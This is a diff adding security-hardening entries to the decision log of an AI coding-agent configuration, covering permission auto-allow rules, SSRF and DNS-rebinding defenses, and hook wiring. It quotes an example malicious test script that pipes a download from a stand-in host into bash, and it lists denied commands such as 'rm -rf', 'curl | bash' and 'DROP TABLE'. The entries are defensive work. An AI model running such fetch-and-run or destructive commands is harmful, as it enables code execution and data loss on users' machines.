@@ -17,6 +17,32 @@
 
 ---
 
+### [2026-07-17] Kept sec-auditor + security-guard separate; wired security-guard into review-squad's release gate instead
+- **Problem:** Coherence audit flagged sec-auditor/security-guard as overlapping
+  (identical `tools`/`model`/`skills:` config, both security-domain) and proposed
+  merging them into one mode-based agent.
+- **Checked first:** this exact merge was already done once (13→9 agents,
+  security-guard merged into sec-auditor) and reverted the same day — see
+  `[2026-03-31] 4 agents restored from _archived/` above. Rationale then: "all 4
+  serve distinct purposes with no overlap."
+- **Decision:** Did NOT redo the merge. Re-reading both files: config is
+  identical but behavior isn't — sec-auditor is real-time (PII masking +
+  injection blocking, already wired into review-squad), security-guard is a
+  structured pre-release checklist (Sentry lookup, PASS/BLOCK verdict) that was
+  invoked by no team at all despite `review-squad.md`'s own "When to Use" listing
+  "Before production deploys" as a trigger nothing actually backed. Added a
+  Release Gate stage to `review-squad.md` that invokes security-guard
+  specifically for production releases, not every routine PR.
+- **Rationale:** The 2026-03-31 "no overlap" framing undersells real config
+  duplication, but the underlying distinction (real-time vs pre-release
+  checklist) is genuine — a straight merge would have flattened it, repeating a
+  change already tried and reverted without addressing why. Wiring the existing
+  gap closed the actual problem (an unused agent, an unbacked trigger claim)
+  without re-litigating a settled decision.
+- **Status:** active
+
+---
+
 ### [2026-04-04] Fix regex replacement in webhook_notify.py
 - **Problem:** `_SECRET_PATTERN.sub(r"\1=[REDACTED]", summary)` raised `PatternError`
   on Python 3.13 — all alternations used non-capturing `(?:...)`, so `\1` was invalid.
@@ -100,4 +126,89 @@
 - **Rationale:** Minimal, safe fix matching `docs/memory-architecture.md`'s own stated target
   ("one canonical memory root") without doing the riskier full retirement of `memory/` in the
   same pass. Restores the write and read path both hooks already expected.
+- **Status:** active
+
+### [2026-07-17] SEC-01: removed pytest/npm test/npm run test/npm run lint from auto-allow
+- **Problem:** External security audit found `hooks/permission_policy.py`'s `SAFE_BASH_PREFIXES`
+  auto-approved `pytest`, `python -m pytest`, `npm test`, `npm run test`, `npm run lint` via
+  `cmd_lower.startswith(prefix)`. Unlike the other safe prefixes (git introspection, ruff, mypy —
+  none of which execute repository-authored code), these commands EXECUTE it: pytest imports
+  `conftest.py`/fixtures/plugins from the working tree before running a single test; `npm test`/
+  `npm run <script>` runs whatever arbitrary shell command `package.json`'s `scripts` section
+  defines. A malicious `conftest.py` or a `"test": "curl evil | bash"` package.json script would
+  execute with the user's privileges, with zero confirmation, the moment an agent ran "the tests"
+  in an untrusted repository. The prefix match also collided on lookalike executable names
+  (`pytest-malicious` starts with "pytest"). An existing test (`test_pytest_allowed`) explicitly
+  asserted the old behavior as correct — this was a deliberate design choice (fewer prompts), not
+  an oversight, but the threat-model gap for untrusted repos was real.
+- **Decision:** Removed all 5 from `SAFE_BASH_PREFIXES`; they now require explicit "ask" like any
+  other command. `ruff`/`mypy` remain auto-allowed (pure static analysis, no code execution).
+  Did NOT implement the audit's full remediation roadmap (sandboxed test-runner profile,
+  capability-scoped approval, exact-argv parsing) — that is a much larger engineering project;
+  this fix closes the specific auto-allow bypass, not the general "should test runners ever be
+  safe to auto-run" question.
+- **Rationale:** The security cost (arbitrary code execution in untrusted repos, zero
+  confirmation) outweighs the convenience benefit (fewer prompts) for a config whose whole
+  premise is evidence-based trust, not convenience-first defaults. Matches the same precedent
+  already set for `cat`/`head`/`tail`/`wc` reading sensitive paths (security audit 2026-07-07/
+  07-12) — narrow the auto-allow surface to genuinely side-effect-free operations only.
+- **Status:** active
+
+### [2026-07-17] SEC-02: webhook DNS check fail-closed + pinned against rebinding TOCTOU
+- **Problem:** External security audit found two related gaps in `hooks/webhook_notify.py`'s
+  SSRF protection: (1) `_resolves_to_blocked_ip` returned `False` (not blocked) when
+  `socket.getaddrinfo` raised `OSError`, treating "can't tell if it's safe" as "it's safe" —
+  the wrong default specifically for an SSRF check; (2) the hostname was resolved ONCE at
+  validation time (`get_webhook_url()`) but `urlopen()` then re-resolved the SAME hostname
+  independently at connect time — a DNS-rebinding attacker could return a safe public IP for
+  the validation check and a private/metadata IP for the real connection moments later.
+- **Decision:** Replaced `_resolves_to_blocked_ip(hostname) -> bool` with
+  `_resolve_safe_ip(hostname) -> str | None`, which fails CLOSED on resolution failure and
+  returns the validated IP itself (not just a bool) so callers can pin the connection to
+  it. `send_webhook()` now resolves the hostname once, immediately before connecting, and
+  monkeypatches `socket.getaddrinfo` (scoped by try/finally, restored before the function
+  returns) so any DNS lookup for that exact hostname during the connection returns the
+  already-validated IP — closing the window between check and connect. `_ValidatingRedirectHandler`
+  extends the same pinning to redirect targets via a shared `pins` dict.
+- **Rationale:** Fail-closed is safe here specifically because `send_webhook` already treats
+  every failure as a normal, silent outcome (fire-and-forget, all exceptions swallowed) — the
+  cost of refusing to resolve is one missed Slack ping, not a broken workflow, unlike
+  `input_guard.py`/`permission_policy.py` where fail-closed on the wrong thing would block a
+  legitimate tool call. Chose a monkeypatched `getaddrinfo` pin over hand-rolled
+  `http.client.HTTPConnection`/`HTTPSConnection` subclasses — same TOCTOU-closing effect,
+  far less code, and TLS/SNI/certificate-hostname verification keeps working unmodified since
+  only the low-level address resolution is intercepted, not the Host header or SNI hostname.
+- **Status:** active
+
+### [2026-07-18] SEC-03: permission_policy.py was wired to a hook event that never fires
+- **Problem:** `hooks/permission_policy.py` was registered under the `PermissionRequest` event.
+  Per Claude Code's own docs (verified via WebFetch against code.claude.com/docs/en/hooks and
+  /en/permissions, not assumed), `PermissionRequest` fires only "when a permission dialog
+  appears". `hooks/settings.json` has `"Bash(*)"` unconditionally in `permissions.allow` — a
+  static rule that auto-approves every Bash command with no dialog ever shown. Since no dialog
+  ever appears for Bash in this repo's own config, `PermissionRequest` never fired for a single
+  Bash command, meaning the entire `decide()` logic — the SEC-01 pytest/npm-test "ask" fix
+  *and* the whole `DANGEROUS_PATTERNS` deny list (`rm -rf`, `curl | bash`, `sudo`, `DROP TABLE`,
+  `git push --force`, etc.) and the sensitive-path-read guard — was dead code for as long as
+  `Bash(*)` has been in the allow list. Found while independently re-verifying two conflicting
+  sub-agent claims about permission precedence (per `audit-verification-gate.md`: an agent's
+  `[VERIFIED]` is only my `[INFERRED]` until checked directly) — neither agent's paraphrase was
+  trusted; the docs were fetched and read verbatim before concluding anything.
+- **Decision:** Moved the hook from `PermissionRequest` to `PreToolUse`/matcher `"Bash"` — the
+  event the docs themselves name as the correct pattern ("add `Bash` to your allow list and
+  register a PreToolUse hook that rejects those specific commands"). `main()` now emits
+  `hookSpecificOutput.permissionDecision` via `utils.emit_permission_decision()` instead of a
+  hand-built `PermissionRequest`/`decision.behavior` payload. Added `hook_main(fail_closed=True)`,
+  matching the treatment already given to other deny-capable hooks (`input_guard.py`,
+  `pre_commit_guard.py`) — this hook was previously called bare, with no timeout/crash
+  protection at all. Synced `hooks/registry.yaml` metadata (`event`/`matcher`), removed
+  `scripts/config_audit_scan.py`'s now-stale check that flagged the *absence* of a
+  `PermissionRequest` registration as a safety gap (its presence there was the actual problem),
+  and corrected two README claims ("~75% fewer prompts" via the dead mechanism) to describe
+  what the hook actually does now.
+- **Rationale:** `decide()`'s logic itself was never in question — only its wiring. `PreToolUse`
+  fires unconditionally on every tool call, before permission rules are evaluated, and can
+  override a matching allow rule via `permissionDecision`/exit-code-2, which is exactly the
+  override capability this hook's threat model requires and `PermissionRequest` structurally
+  cannot provide once a blanket allow rule exists.
 - **Status:** active
